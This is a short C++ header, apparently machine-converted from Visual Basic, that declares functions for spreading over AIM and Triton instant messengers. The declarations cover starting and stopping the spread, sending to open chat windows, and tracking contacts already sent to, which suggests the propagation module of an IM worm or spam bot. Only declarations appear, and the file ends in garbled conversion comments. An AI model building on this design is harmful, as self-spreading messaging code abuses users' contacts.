#if !defined(AFX_MODSPREADAIM_H__8D29D925_CFCD_4078_A0E2_D60F39786B22__INCLUDED_)
#define AFX_MODSPREADAIM_H__8D29D925_CFCD_4078_A0E2_D60F39786B22__INCLUDED_

// modSpreadAIM.h : header file
//

//{{chodebot_Class_Global(modSpreadAIM)
//}}chodebot_Class_Global
	//{{chodebot_Class_Public(modSpreadAIM)
	
	void CloseTritonGroupIM();
	bool AIMAlreadySent(CString strNick);
	bool TritonAlreadySent(CString strNick);
	void AIMAddSent(CString strNick);
	void TritonAddSent(CString strNick);
	void AIMCleanSent();
	void TritonCleanSent();
	int FindAIMWindow(CString strUser);
	void FindOpenTritonWindows(CStringArray strNick, int* lngHwnd, int& lngNickCount);
	void FindOpenAIMWindows(CStringArray strNicks, int& lngNickCount);
	void SendAIM(int& hwnd, CString strScreenname);
	void SendTriton(int& lHwnd, CString strSN);
	void StopAIMSpread();
	void StartAIMSpread();
	//}}chodebot_Class_Public


	//=========================================================

/*? Public *//*? () As */
 /*? Public *//*? () As Long
Public *//*? As Long
//
Public *//*? () As */
 /*? Public *//*? () As Long
Public *//*? As Long */


#endif // !defined(AFX_MODSPREADAIM_H__8D29D925_CFCD_4078_A0E2_D60F39786B22__INCLUDED_)
